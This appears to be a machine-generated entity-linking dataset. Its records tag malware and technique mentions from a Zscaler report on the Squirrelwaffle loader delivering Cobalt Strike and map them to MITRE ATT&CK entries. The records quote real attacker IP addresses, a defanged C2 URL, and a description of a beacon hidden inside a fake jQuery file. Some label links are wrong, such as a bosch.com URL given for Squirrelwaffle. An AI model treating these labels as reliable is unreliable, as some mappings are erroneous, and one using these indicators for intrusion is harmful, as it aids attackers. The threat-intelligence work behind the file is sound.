{"mention": "Cobalt Strike", "context_left": "![Figure 11:", "context_right": "stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "_context_left": "![Figure 11: ", "_context_right": " stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "sentence_left": "The EICAR string is likely an artifact from the threat actor using a [demo version of Cobalt Strike](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "sentence_right": "Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 11: Cobalt Strike stager delivered by", "context_right": "with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "_context_left": "![Figure 11: Cobalt Strike stager delivered by ", "_context_right": " with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "sentence_left": "The EICAR string is likely an artifact from the threat actor using a [demo version of Cobalt Strike](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "sentence_right": "Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/Strings%20in%20cobaltstrike.PNG)", "_context_left": "![Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/Strings%20in%20cobaltstrike.PNG)", "sentence_left": "The EICAR string is likely an artifact from the threat actor using a [demo version of Cobalt Strike](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "sentence_right": "Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike stager delivered by Squirrelwaffle", "context_left": "![Figure 11:", "context_right": "with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "_context_left": "![Figure 11: ", "_context_right": " with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "sentence_left": "The EICAR string is likely an artifact from the threat actor using a [demo version of Cobalt Strike](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "sentence_right": "Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "Figure 11:", "context_right": "stager delivered by Squirrelwaffle with interesting strings highlighted.", "_context_left": "Figure 11: ", "_context_right": " stager delivered by Squirrelwaffle with interesting strings highlighted.", "sentence_left": "![Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "sentence_right": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 11: Cobalt Strike stager delivered by", "context_right": "with interesting strings highlighted.", "_context_left": "Figure 11: Cobalt Strike stager delivered by ", "_context_right": " with interesting strings highlighted.", "sentence_left": "![Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "sentence_right": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike stager delivered by Squirrelwaffle", "context_left": "Figure 11:", "context_right": "with interesting strings highlighted.", "_context_left": "Figure 11: ", "_context_right": " with interesting strings highlighted.", "sentence_left": "![Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "sentence_right": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "The", "context_right": "stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "_context_left": "The ", "_context_right": " stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "sentence_left": "Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.", "sentence_right": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "context_left": "The", "context_right": "", "_context_left": "The ", "_context_right": "", "sentence_left": "Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.", "sentence_right": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "label": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.", "label_id": 415, "label_title": "Data Obfuscation", "label_link": "https://attack.mitre.org/techniques/T1001", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "The", "context_right": "CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "_context_left": "The ", "_context_right": " CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "sentence_left": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "sentence_right": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "CnC server", "context_left": "The Cobalt Strike", "context_right": "responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "_context_left": "The Cobalt Strike ", "_context_right": " responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "sentence_left": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "sentence_right": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon", "context_left": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted", "context_right": "embedded as binary data in the middle of the file as shown in Figure 12.", "_context_left": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted ", "_context_right": " embedded as binary data in the middle of the file as shown in Figure 12.", "sentence_left": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "sentence_right": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon", "context_left": "", "context_right": "embedded as binary data in the middle of the file as shown in Figure 12.", "_context_left": "", "_context_right": " embedded as binary data in the middle of the file as shown in Figure 12.", "sentence_left": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "sentence_right": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon", "context_left": "![Figure 12: Encrypted", "context_right": "embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "_context_left": "![Figure 12: Encrypted ", "_context_right": " embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "sentence_left": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "sentence_right": "Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/jquery.png)", "_context_left": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/jquery.png)", "sentence_left": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "sentence_right": "Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon", "context_left": "Figure 12: Encrypted", "context_right": "embedded in jQuery code starting at offset 0xfaf.", "_context_left": "Figure 12: Encrypted ", "_context_right": " embedded in jQuery code starting at offset 0xfaf.", "sentence_left": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "sentence_right": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Encrypted Cobalt Strike beacon embedded in jQuery code starting", "context_left": "Figure 12:", "context_right": "at offset 0xfaf.", "_context_left": "Figure 12: ", "_context_right": " at offset 0xfaf.", "sentence_left": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "sentence_right": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon", "context_left": "This binary data consists of shellcode that decrypts the", "context_right": "using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "_context_left": "This binary data consists of shellcode that decrypts the ", "_context_right": " using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "sentence_left": "Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.", "sentence_right": "![Figure 13: Cobalt Strike beacon decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "shellcode that decrypts the Cobalt Strike beacon", "context_left": "This binary data consists of", "context_right": "using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "_context_left": "This binary data consists of ", "_context_right": " using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "sentence_left": "Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.", "sentence_right": "![Figure 13: Cobalt Strike beacon decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)", "label": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "label_id": 514, "label_title": "Deobfuscate/Decode Files or Information", "label_link": "https://attack.mitre.org/techniques/T1140", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon", "context_left": "![Figure 13:", "context_right": "decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)", "_context_left": "![Figure 13: ", "_context_right": " decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)", "sentence_left": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "sentence_right": "Figure 13: Cobalt Strike beacon decryption algorithm.", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 13: Cobalt Strike beacon decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/Algorithm.png)", "_context_left": "![Figure 13: Cobalt Strike beacon decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/Algorithm.png)", "sentence_left": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "sentence_right": "Figure 13: Cobalt Strike beacon decryption algorithm.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon decryption algorithm.", "context_left": "![Figure 13:", "context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)", "_context_left": "![Figure 13: ", "_context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)", "sentence_left": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "sentence_right": "Figure 13: Cobalt Strike beacon decryption algorithm.", "label": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "label_id": 514, "label_title": "Deobfuscate/Decode Files or Information", "label_link": "https://attack.mitre.org/techniques/T1140", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon", "context_left": "Figure 13:", "context_right": "decryption algorithm.", "_context_left": "Figure 13: ", "_context_right": " decryption algorithm.", "sentence_left": "![Figure 13: Cobalt Strike beacon decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)", "sentence_right": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike beacon", "context_left": "The", "context_right": "observed by Zscaler ThreatLabz contains the following CnC servers:", "_context_left": "The ", "_context_right": " observed by Zscaler ThreatLabz contains the following CnC servers:", "sentence_left": "Figure 13: Cobalt Strike beacon decryption algorithm.", "sentence_right": "*hxxps://systemmentorsec.com/jquery-3.3.1.min.js,*", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "CnC servers", "context_left": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following", "context_right": ":", "_context_left": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following ", "_context_right": ":", "sentence_left": "Figure 13: Cobalt Strike beacon decryption algorithm.", "sentence_right": "*hxxps://systemmentorsec.com/jquery-3.3.1.min.js,*", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
